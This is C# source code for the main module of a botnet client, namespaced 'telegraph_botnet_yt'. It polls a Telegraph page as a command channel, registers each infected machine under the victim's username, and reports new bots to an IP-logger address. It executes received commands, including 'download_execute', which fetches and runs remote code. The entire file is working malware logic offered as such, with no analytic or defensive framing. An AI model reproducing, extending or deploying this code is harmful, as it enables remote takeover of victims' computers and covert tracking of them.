using System;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;

namespace telegraph_botnet_yt
{
    class cMain
    {
        static string last_cmd = string.Empty;

        static TelegraphServer tserver;
        static string tgpage = string.Empty;
        static string report = string.Empty;

        static string username = Environment.UserName;

        static void Main(string[] args)
        {
            CheckLocalCMD();
            TelegraphServerStart();

            while (true)
            {
                string html = web.GetHTML(configs.server);

                Match regx = Regex.Match(html, "<p>(.*)</p></article>");
                string content = regx.Groups[1].Value;

                if(last_cmd == content)
                {
                    tserver.EditPage(tgpage, username, $"{DateTime.Now.ToString()}{configs.spliter2}LastCMD: {last_cmd}");

                    Thread.Sleep(configs.delay);
                    continue;
                }
                last_cmd = content;
                File.WriteAllText(configs.local_cmd, last_cmd);

                cmd command = new cmd(content);
                Execute(command);

                tserver.EditPage(tgpage, username, $"{DateTime.Now.ToString()}{configs.spliter2}LastCMD: {last_cmd}");

                Thread.Sleep(configs.delay);
            }
        }

        static void CheckLocalCMD()
        {
            if (File.Exists(configs.local_cmd))
            {
                try
                {
                    last_cmd = File.ReadAllText(configs.local_cmd);
                }
                catch { }
            }
        }

        static void TelegraphServerStart()
        {
            tserver = new TelegraphServer();

            if (File.Exists(configs.telegraph_auth_token))
            {
                string auth_token = File.ReadAllText(configs.telegraph_auth_token);
                tserver = new TelegraphServer(auth_token);
            }
            else
            {
                tserver.CreateAccount("BOT_" + username);
                File.WriteAllText(configs.telegraph_auth_token, tserver.access_token);

                tserver.CreatePage(username);
                web.SendHttpWebRequest(configs.ipLogger, "https://telegra.ph/" + tserver.GetPageList()[0], "This is new bot - " + username);
            }

            tgpage = tserver.GetPageList()[0];
        }

        static void Execute(cmd CMD)
        {
            switch (CMD.ComType)
            {
                case "open_link":

                    functions.OpenLink(CMD.ComContent);
                    break;

                case "download_execute":

                    functions.DownloadExecute(CMD.ComContent);
                    break;

                case "exit":

                    Environment.Exit(0);
                    break;
            }
        }
    }
}
